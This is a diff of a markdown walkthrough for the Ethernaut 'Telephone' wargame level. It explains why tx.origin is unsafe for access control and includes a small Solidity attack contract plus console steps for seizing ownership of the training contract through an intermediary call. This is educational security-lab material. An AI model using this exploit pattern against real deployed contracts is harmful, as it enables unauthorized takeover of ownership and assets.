@@ -1,160 +1,98 @@
-# Telephone – Level 6 Walkthrough
+# Telephone
 
-Welcome to the **Telephone** level of the [**Ethernaut**](https://ethernaut.openzeppelin.com/) wargame by OpenZeppelin, focused on understanding **`tx.origin` misuse** in access control.
+## Objective
 
----
-
-## Challenge Objective
-
-You are given a contract with an ownership change function that improperly uses `tx.origin` for authentication. Your goal is to:
-
-- Exploit the contract's flawed use of `tx.origin`
-- Become the new `owner` of the contract
-- Submit the instance to complete the level
-
----
-
-## Prerequisites
-
-Before you begin, ensure the following:
-
-- MetaMask is installed and connected to the same testnet
-- You have test ETH (e.g., on Sepolia or Goerli)
-- Familiarity with Remix IDE, MetaMask, and browser DevTools
-- Access to the [Ethernaut Game](https://ethernaut.openzeppelin.com/)
+Exploit the Telephone contract's flawed use of `tx.origin` in access control to become the new owner of the contract instance.
 
 ---
 
 ## Getting Started
 
-### 1. Load the Level
+1. Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
+2. Select the **"Telephone"** level
+3. Click **“Get new instance”** and approve the transaction in MetaMask
+4. The instance is now deployed and available as the `contract` object in the browser console
+5. Save the instance address:
 
-- Navigate to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
-- Select **“Telephone”** from the level list
-- Click **"Get new instance"**
-- Approve the MetaMask transaction
-
-Once deployed, a `contract` object is available in the browser DevTools console.
-
----
-
-## Vulnerability Background
-
-The Telephone contract uses `tx.origin` instead of `msg.sender` in its `changeOwner()` function:
-
-```solidity
-function changeOwner(address _owner) public {
-    if (tx.origin != msg.sender) {
-        owner = _owner;
-    }
-}
-```
-
-This logic **prevents direct calls** from the EOA (your wallet), because in such a case `tx.origin == msg.sender`.
-
-But if we call this function **via another contract**, then `msg.sender` will be the intermediate contract, and `tx.origin` will be your wallet — thus satisfying the condition.
+    ```js
+    contract.address
+    ```
 
 ---
 
-## Walkthrough – Step by Step
+## Walkthrough
 
-### Step 1: Write the Exploit Contract
-
-Open [Remix IDE](https://remix.ethereum.org/) and create a new file: `TelephoneAttack.sol`
-
-Paste this code:
+### Step 1: Write and Deploy the Attack Contract
 
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 interface ITelephone {
-    function changeOwner(address _owner) external;
+     function changeOwner(address _owner) external;
 }
 
 contract TelephoneAttack {
-    function attack(address target) public {
-        ITelephone(target).changeOwner(msg.sender);
-    }
+     function attack(address target) public {
+          ITelephone(target).changeOwner(msg.sender);
+     }
 }
 ```
 
-This contract:
-
-- Calls `changeOwner()` on the vulnerable contract
-- Since this is a contract call, `msg.sender ≠ tx.origin` in the target function
-- `msg.sender = this contract`, `tx.origin = your wallet`, so it passes the check
+**Explanation:**
+This contract calls `changeOwner()` on the vulnerable Telephone contract. Since the call originates from a contract, `msg.sender` is the attack contract and `tx.origin` is your wallet, satisfying the flawed check.
 
 ---
 
 ### Step 2: Compile and Deploy the Attack Contract
 
-1. Go to the **Solidity Compiler** tab
-2. Select **version 0.8.x**
-3. Click **Compile TelephoneAttack.sol**
+- Compile `TelephoneAttack.sol` in Remix using Solidity 0.8.x
+- Deploy the contract using the `Injected Provider - MetaMask` environment
 
-Then:
-
-1. Go to the **Deploy & Run Transactions** tab
-2. Set **Environment** to `Injected Provider - MetaMask`
-3. Make sure the correct wallet/network is selected
-4. Click **Deploy** (no constructor args needed)
+**Explanation:**
+Deploying the attack contract prepares you to interact with the Telephone instance as an intermediary, bypassing the `tx.origin` check.
 
 ---
 
 ### Step 3: Execute the Attack
 
-1. Expand your deployed contract in Remix
-2. In the `attack()` input box, paste your **Telephone contract instance address** (from the console: `contract.address`)
-3. Click **attack()**
-4. Confirm transaction in MetaMask
+```js
+// In Remix, call:
+attack(<TELEPHONE_CONTRACT_ADDRESS>)
+```
+
+**Explanation:**
+Calling `attack()` with the Telephone contract address triggers the exploit, making you the new owner.
 
 ---
 
 ### Step 4: Confirm Ownership
 
-Back in the Ethernaut console:
-
 ```js
 await contract.owner()
 ```
 
-It should now return **your address**.
-
----
-
-### Step 5: Submit the Level
-
-Click **Submit Instance** in the Ethernaut UI and confirm in MetaMask.
-
-🎉 Done! You've completed the Telephone level.
+**Explanation:**
+Verifies that your address is now the owner of the Telephone contract instance.
 
 ---
 
 ## What You Learn
 
-- `tx.origin` is dangerous for access control
-- Difference between `msg.sender` and `tx.origin`
-- Why authentication should rely on `msg.sender`
-- How to craft simple exploit contracts
+This level teaches the following:
+
+* Why `tx.origin` is unsafe for access control
+* The difference between `msg.sender` and `tx.origin`
+* How to exploit contracts that use improper authentication
+* The importance of using `msg.sender` for authorization logic
 
 ---
 
-## Concepts Covered
+## Resources Used
 
-| Concept                     | Description                                                                  |
-| --------------------------- | ---------------------------------------------------------------------------- |
-| `tx.origin` vs `msg.sender` | `tx.origin` is always the original EOA; `msg.sender` is the immediate caller |
-| Access control              | Proper ownership checks must use `msg.sender`                                |
-| Contract interaction        | Using contracts to spoof call context                                        |
-| Interface injection         | Calling external contracts via interfaces                                    |
-
----
-
-## Resources
-
-- [Ethernaut Game](https://ethernaut.openzeppelin.com/)
-- [Solidity Docs – `tx.origin`](https://docs.soliditylang.org/en/latest/security-considerations.html#tx-origin)
-- [blog](https://shubhamm.me/blog/ethernaut_challenges_telephone)
+* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
+* [Solidity Docs – `tx.origin`](https://docs.soliditylang.org/en/latest/security-considerations.html#tx-origin)
+* [Remix IDE](https://remix.ethereum.org/)
+* [External writeup](https://shubhamm.me/blog/ethernaut_challenges_telephone)
 
 ---
